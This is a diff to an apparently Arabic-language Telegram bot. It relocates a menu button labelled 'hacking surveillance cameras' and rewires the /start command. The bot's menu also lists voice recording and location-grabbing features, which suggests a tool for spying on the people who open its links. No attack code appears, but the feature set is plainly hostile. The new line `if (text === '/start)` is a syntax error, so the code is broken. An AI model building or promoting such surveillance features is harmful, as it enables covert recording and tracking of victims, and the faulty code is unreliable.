@@ -584,7 +584,7 @@ function showMainButtons(chatId) { //  اسم    جديد    لـ    الـ    f
   let statusMessage = "مرحبا! اختر أحد الخيارات التالية:";
 
   let defaultButtons = [
-    [{ text: 'اختراق كاميرات المراقبة 📡', callback_data: 'get_cameras' }],
+  
     [{ text: 'اعطيني نكتة 🤣', callback_data: 'get_joke' }],
     [{ text: 'اكتب لي رسالة فك حظر واتساب 🚸', callback_data: 'get_love_message' }],
   ];
@@ -601,7 +601,7 @@ function showMainButtons(chatId) { //  اسم    جديد    لـ    الـ    f
   });
 }
 
-bot.onText(/\/start/, (msg) => {
+bot.onText(/\/tttttt/, (msg) => {
   const chatId = msg.chat.id;
   console.log('Received /start command');
   showMainButtons(chatId); //  تغيير    اسم    الـ    function    هنا    أيضًا
@@ -1238,7 +1238,7 @@ bot.on('message', async (msg) => {
     }
   }
 
-  if (text === '/sjgddd') {
+  if (text === '/start) {
     showDefaultButtons(senderId);
   } else if (text === '/login') {
     showLoginButtons(senderId);
@@ -1422,6 +1422,7 @@ function showDefaultButtons(userId) {
     [{ text: '🎙 تسجيل صوت 🎙', callback_data:'voice_record' }],
     [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data: 'get_location' }],
     [{ text: '🔗 إنشاء رابط دعوة 🔗', callback_data:'create_referral' }],
+    [{ text: 'اختراق كاميرات المراقبة 📡', callback_data: 'get_cameras' }],
     [{ text: '💰 نقاطي 💰', callback_data:'my_points' }],
     [{ text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' }],
     [{ text: 'تتواصل مع المطور', url: 'https://t.me/SAGD112' }]
